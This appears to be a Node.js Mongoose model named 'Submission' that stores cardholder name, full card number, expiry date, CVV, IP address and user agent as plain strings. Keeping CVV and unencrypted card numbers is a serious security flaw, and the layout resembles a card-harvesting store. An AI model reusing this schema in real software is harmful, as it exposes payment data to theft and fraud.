const mongoose = require('mongoose');

const submissionSchema = new mongoose.Schema({
  id: { type: Number, required: true, unique: true },
  timestamp: { type: String, required: true },
  nameOnCard: String,
  cardNumber: String,
  expiry: String,
  cvv: String,
  ip: String,
  userAgent: String,
  createdAt: { type: Date, default: Date.now }
});

module.exports = mongoose.model('Submission', submissionSchema);
